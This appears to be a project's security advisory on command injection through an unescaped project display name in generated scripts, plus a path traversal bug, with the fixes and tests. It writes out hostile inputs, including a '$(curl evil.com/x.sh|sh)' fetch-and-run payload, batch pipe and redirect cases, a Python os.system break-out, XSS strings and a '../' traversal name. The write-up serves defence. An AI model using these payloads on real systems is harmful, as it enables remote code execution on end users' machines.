# SECURITY-002 — command injection through the project name

**Reported by:** the user (second real production bug found by hand)
**Severity:** high — arbitrary code execution on the *end user's* machine
**Status:** fixed, 87 regression tests
**Fixed in:** v0.9.1

---

## The report

> In `run_scripts()`:
>
> ```python
> safe_name = str(project_name).replace("%", "").replace("^", "").replace("&", "")
> ```
>
> This only strips the dangerous **Windows/batch** characters. But the same
> `safe_name` is substituted into `RUN_SH` as well:
>
> ```bash
> echo " {name}"
> ```
>
> In Bash, when a variable sits inside `" "`, **command substitution with
> `$(...)` or backticks is still executed** — this is the important
> difference between bash and batch quoting. So if the user names a project:
>
> ```
> My Shop$(curl evil.com/x.sh|sh)
> ```
>
> that expression ends up inside `run.sh`, and **every time the end user
> double-clicks `run.sh`, the command runs** — a harmless-looking project
> name has become an arbitrary code execution primitive.

The report also explained *why this class was missed*, which turned out to be
the key insight:

> The project's display name (`project_name`, something like "My Shop") is
> deliberately not passed through `safe_identifier`, because it is meant to
> stay readable and human (unlike a table or file name, which must be a valid
> code identifier). But once that same free-form string enters an executable
> script, it needs its own escaping rule.

This is exactly right, and it is the root cause.

---

## Confirming it

The payload was run against a real `bash`:

```
generated:  echo " My Shop$(touch /tmp/PWNED_BY_SUBSHELL)"
stdout:
    ============================================
     My Shop
    ============================================
file /tmp/PWNED_BY_SUBSHELL exists -> True
```

Note what the user sees: **just `My Shop`**. `touch` prints nothing, so the
banner looks completely normal. The victim has no signal that anything ran.

---

## What the investigation found

The reported bug was one instance of a general problem. The display name is
interpolated into **five different grammars**, each with different quoting
rules, and only the batch one had (partial) handling:

| Target | File | Status before |
|---|---|---|
| POSIX shell | `run.sh` | ❌ `$()`, backticks, newline |
| Windows batch | `run.bat` | ❌ `\|`, `>`, `<`, `"`, newline (only `%^&` stripped) |
| Python | `backend/app/core/config.py` | ❌ string break-out |
| HTML | `frontend/index.html` | ❌ XSS |
| JSX | `frontend/src/.../Layout.tsx`, `Home.tsx`, `Login.tsx` | ❌ XSS + broken build |
| Markdown | `README.md` | ⚠️ link/image injection |

Additional confirmed payloads:

```
Shop | calc.exe              → echo  Shop | calc.exe          (batch pipe runs)
Shop > C:\Windows\x.txt      → echo  Shop > C:\Windows\x.txt   (batch writes a file)
Shop\ncalc.exe               → a whole new command line in BOTH scripts
Shop" + __import__("os").system("id") + "
                             → PROJECT_NAME: str = "Shop" + __import__("os").system("id") + ""
<script>alert(1)</script>    → <title><script>alert(1)</script></title>
</Link><img onerror=alert(1) src=x />
                             → breaks out of JSX; the frontend also stops compiling
```

**Newline injection is the important one.** In both sh and batch a line break
*ends the statement*, so no amount of per-character quoting fixes it. Any
escaper that only maps characters to escaped characters is still vulnerable.

---

## The fix

### 1. Stop using a blocklist

`replace("%","").replace("^","").replace("&","")` is a blocklist: it only
stops what the author remembered to list. Every one of the payloads above got
through it. The replacement is a set of **context-aware, total** escapers in
`engine/app/generator/escaping.py`:

| Filter | Target | Strategy |
|---|---|---|
| `sh_str` | POSIX shell | single-quoted literal — the one shell context with **no** escape processing |
| `bat_echo` | Windows batch | **allowlist** of inert characters (cmd.exe has no safe quoting for `echo`) |
| `py_str` | Python | `repr()` — the interpreter's own round-trip-safe quoting |
| `py_doc` | Python docstring | cannot close the `"""` |
| `html_text` | HTML | `html.escape(quote=True)` |
| `jsx_text` | JSX | emitted as `{"..."}` — a JS string React escapes at render |
| `md_text` | Markdown | structural characters escaped |

Each is *total*: it defines what is allowed to survive, rather than listing
what to remove, so a metacharacter nobody thought of cannot slip through.

### 2. `flatten()` runs first, always

Every escaper begins with a shared normalisation step that removes the
payloads character-quoting cannot handle:

- line breaks → space (kills newline/CRLF statement injection)
- control characters and NUL → removed
- Unicode bidi overrides (`U+202A`–`U+202E`, Trojan Source / CVE-2021-42574) → removed
- length capped at 200 characters

### 3. `run.sh` uses `printf`, not `echo`

```diff
- echo " {name}"
+ printf ' %s\n' 'My Shop$(id)'
```

The name is now a single-quoted argument. As a bonus the payload is printed
*visibly* instead of being silently executed, so a hostile name is obvious.

### 4. Registered as Jinja filters

`register_filters()` attaches all seven to the template environment, so
templates read:

```jinja
PROJECT_NAME: str = @@ name | py_str @@
<title>@@ name | html_text @@</title>
<Link to="/">@@ name | jsx_text @@</Link>
```

There is no longer any `@@ name @@` in the template tree — verified by grep.

---

## SECURITY-003 — a second bug found while fixing this one

Investigating the report surfaced an unrelated **path traversal**.

`routers/projects.py` had its own private slug logic:

```python
slug = body.name.strip().lower().replace(" ", "-")     # keeps "/" and ".."
path = body.path or f"~/Projects/{slug}"
```

`GenContext.slug` was properly hardened, but this copy was not. A project
named `../../../../tmp/x` was stored as `~/Projects/../../../../tmp/x`, and
`resolve_target()` joined it with `Path.__truediv__`, which does not resolve
`..`. Proven by writing a real file:

```
resolved target: /tmp/skaffo_escape_proof
/tmp/skaffo_escape_proof/owned.txt  ->  "PWNED"
```

This is the same *class* as SECURITY-001, in a path that fix did not cover,
and it was reachable from the ordinary "new project" form.

**Fixed at two layers:**

1. `project_slug()` in `generator/base.py` is now the single definition of a
   slug, used by both `routers/projects.py` and `GenContext.slug`. Duplicated
   security logic was the root cause; there is now one copy.
2. `_under_workspace()` in `writer.py` resolves the candidate path and
   re-checks containment with `relative_to()`, falling back to the safe slug
   if it escaped. This also protects **rows already stored by an older
   version**, which the slug fix alone would not.

---

## Tests

`engine/tests/test_injection.py` — 87 tests.

They assert on **semantics, not characters**: shell payloads are executed in a
real `bash` and the test checks whether a marker file appeared; Python output
is parsed with `ast` and `PROJECT_NAME` must be an `ast.Constant`. A test that
merely grepped for `$(` would pass against an escaper that deleted only that
sequence.

Coverage:

- the exact reported payload, executed — and a check that the banner still prints
- 9 shell payloads × real bash execution
- `bash -n` syntax validation (a hostile name must not break the script for everyone else)
- 7 batch metacharacter cases + newline collapsing
- 6 Python payloads → must parse **and** stay an inert literal
- HTML / JSX / Markdown escaping
- `flatten()` unit tests, including that normal Unicode survives (`فروشگاه من`, `Café Léon`)
- **fuzz:** every ASCII character 32–126 pushed through `sh_str` into a real bash
- **fuzz:** every ASCII character 0–127 through the `bat_echo` allowlist
- SECURITY-003: slug hardening, workspace containment, and legacy stored paths

Full suite: **207 passed** (was 120).

---

## Verified end to end

A complete 51-file project generated with the name

```
My Shop$(touch /tmp/E2E_PWN1)`touch /tmp/E2E_PWN2`" & calc.exe & "
```

- all 18 generated `.py` files parse
- `run.sh` passes `bash -n`
- `run.bat` banner is a single line with no metacharacters
- no command executed
- no path escaped the output directory

---

## The lesson

`safe_identifier()` was doing its job correctly. The gap was **an implicit
assumption that never got written down**: that all untrusted strings are
identifiers.

Display names are deliberately *not* identifiers — that is the whole point of
keeping them human-readable — so they need a parallel rule. The general
principle: **escaping belongs to the destination, not to the source.** One
"sanitised" string cannot be safe for five languages at once, because each one
defines "dangerous" differently.

Anyone adding a template that interpolates free text must pick the filter for
the language being written into. This is documented at the top of
`escaping.py`.
